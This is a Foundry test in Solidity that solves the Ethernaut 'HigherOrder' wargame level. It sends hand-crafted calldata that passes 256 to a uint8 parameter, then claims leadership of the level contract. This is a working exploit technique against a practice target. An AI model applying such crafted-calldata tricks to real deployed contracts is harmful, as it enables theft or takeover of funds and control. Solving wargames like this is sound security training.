pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../src/ethernaut/core/Ethernaut.sol";

interface IHigherOrder {
    function registerTreasury(uint8) external;

    function claimLeadership() external;
}

contract HigherOrderTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        //setup
        ethernaut = new Ethernaut();
    }

    function testAttck() public {
        address factory = deployCode("HigherOrderFactory.sol");
        ethernaut.registerLevel(Level(factory));
        address levelAddress = ethernaut.createLevelInstance(Level(factory));

        //0x211c85ab
        emit log_bytes32(
            bytes4(abi.encodeWithSignature("registerTreasury(uint8)"))
        );
        // 256
        // 0000000000000000000000000000000000000000000000000000000000000100
        // levelAddress.call(hex"211c85ab0000000000000000000000000000000000000000000000000000000000000100");
        //这种方式更直观
        levelAddress.call(
            abi.encodeWithSignature("registerTreasury(uint8)", 256)
        );
        IHigherOrder(levelAddress).claimLeadership();
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(levelSuccessfullyPassed);
    }
}
